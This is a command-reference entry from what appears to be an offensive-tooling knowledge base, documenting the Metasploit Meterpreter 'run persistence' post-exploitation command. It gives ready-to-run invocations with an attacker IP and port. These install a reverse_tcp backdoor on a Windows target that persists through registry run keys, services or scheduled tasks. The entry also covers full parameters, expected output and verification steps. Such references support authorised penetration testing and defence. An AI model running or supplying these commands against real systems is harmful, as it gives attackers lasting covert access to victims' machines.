---
id: 467be8cb-1432-4e67-86da-07cf059db230
name: meterpreter-run-persistence
type: command
executor: meterpreter
data: run persistence -U -i $_INTERVAL -p $_LPORT -r $_LHOST
output: |-
  [*] Persistence service written to C:\Windows\Temp\persistence.exe
  [*] Persistence script written to C:\Windows\Temp\persistence.bat
created_at: '2023-04-06T03:56:21.394004+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - persistence
  - metasploit
  - meterpreter
verified: true
validated: true
---

# meterpreter-run-persistence

## Command

```meterpreter
run persistence $_OPTIONS
```

## Description

This command, executed within an active Meterpreter session, deploys a persistent backdoor on the target Windows system. It generates and installs a payload that connects back to the attacker's listener using specified options for triggers like user logon (-U) or system boot (-S/X). Default payload is windows/meterpreter/reverse_tcp, written to %TEMP%. Use this in post-exploitation to maintain access across reboots.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -U | Automatically start agent on user logon (registry run key) | No |
| -S | Start agent on boot as a service (SYSTEM privileges, scheduled task) | No |
| -X | Start agent on system boot (alternative to -S) | No |
| -i <interval> | Interval in seconds between connection attempts ($_INTERVAL, default 5) | No |
| -p <port> | Port on attacker's system for connect-back ($_LPORT) | Yes if -r used |
| -r <ip> | IP of attacker's system for connect-back ($_LHOST) | Yes if -p used |
| -L <path> | Custom location to write payload (default %TEMP%) | No |
| -P <payload> | Custom payload (default windows/meterpreter/reverse_tcp) | No |
| -A | Auto-start matching handler on attacker side | No |
| -T <template> | Alternate executable template | No |
| -h | Show help menu | No |

## Examples

### Basic Usage (User Logon Persistence)

```meterpreter
run persistence -U -i 5 -p 4444 -r 192.168.1.100
```

### Advanced Usage (System Service)

```meterpreter
run persistence -S -i 10 -p 4444 -r 192.168.1.100 -L C:\Windows\Temp
```

## Expected Output

Successful execution produces output like:

```
[*] Running Persistence Script
[*] Creating Executable persistence.exe (payload: windows/meterpreter/reverse_tcp)
[*] Persistence service written to C:\Windows\Temp\persistence.exe
[*] Persistence script written to C:\Windows\Temp\persistence.bat
[*] Scheduled task 'MgFwFnGq' created to execute payload on boot
[*] Add the following registry key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\BgExecc = C:\Windows\Temp\persistence.bat
```

If errors occur (e.g., insufficient privileges), it will report "[-] Failed to open registry key" or similar. Verify installation via shell commands like 'reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run' or 'schtasks /query'.

## Related

- [[procedures/Windows-Persistence-with-Meterpreter]]
- [[tools/Metasploit-Framework]]
